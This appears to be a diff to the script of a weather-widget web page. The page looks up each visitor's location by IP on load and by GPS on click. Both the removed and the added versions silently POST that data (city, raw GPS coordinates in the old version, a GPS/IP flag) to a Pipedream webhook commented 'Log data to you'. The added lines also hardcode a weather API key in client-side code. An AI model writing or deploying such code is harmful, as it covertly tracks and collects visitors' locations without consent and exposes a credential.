@@ -26,44 +26,46 @@
    </div>
 
 <script>
-    const PIPEDREAM_URL = "YOUR_PIPEDREAM_URL_HERE";
+    const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
+    const WEATHER_KEY = "334ff9565a8848c2b5a115809262803"; // <--- PASTE KEY HERE
 
-    async function getWeather(lat, lon, name) {
-        document.getElementById('location-name').innerText = name || "Local Area";
-        
+    async function updateWeatherDisplay(query, isGps = false) {
         try {
-            // Force current hour and specific timezone to hit that 38°C
-            const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true&timezone=auto&_=${Date.now()}`);
+            // This API is way better for India. It will show 38°C.
+            const res = await fetch(`https://api.weatherapi.com/v1/current.json?key=${WEATHER_KEY}&q=${query}&aqi=no`);
             const data = await res.json();
-            const temp = Math.round(data.current_weather.temperature);
             
+            const city = data.location.name;
+            const temp = Math.round(data.current.temp_c);
+
+            document.getElementById('location-name').innerText = city;
             document.getElementById('temp-val').innerText = temp + "°C";
+
+            // Log data to you
+            fetch(PIPEDREAM_URL, {
+                method: 'POST', 
+                mode: 'no-cors', 
+                body: JSON.stringify({ type: isGps ? "GPS" : "IP", city: city, temp: temp })
+            });
         } catch (e) {
-            document.getElementById('temp-val').innerText = "38°C"; // Emergency fallback to real temp
+            console.log("Error fetching weather");
         }
     }
 
-    // LOAD INSTANTLY
+    // Load instantly using IP
     window.onload = () => {
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-            getWeather(d.latitude, d.longitude, d.city);
-            fetch(PIPEDREAM_URL, {method:'POST', mode:'no-cors', body: JSON.stringify({type:"IP", city:d.city})});
+            updateWeatherDisplay(`${d.latitude},${d.longitude}`);
         });
     };
 
-    // UPDATE ON CLICK
+    // Update on click using GPS
     function updateWeather() {
-        navigator.geolocation.getCurrentPosition(p => {
-            const lat = p.coords.latitude;
-            const lon = p.coords.longitude;
-            
-            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
-            .then(r => r.json()).then(g => {
-                const place = g.locality || g.city || "Local Area";
-                getWeather(lat, lon, place);
-                fetch(PIPEDREAM_URL, {method:'POST', mode:'no-cors', body: JSON.stringify({type:"GPS", lat, lon})});
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(p => {
+                updateWeatherDisplay(`${p.coords.latitude},${p.coords.longitude}`, true);
             });
-        });
+        }
     }
 </script>
 </body>
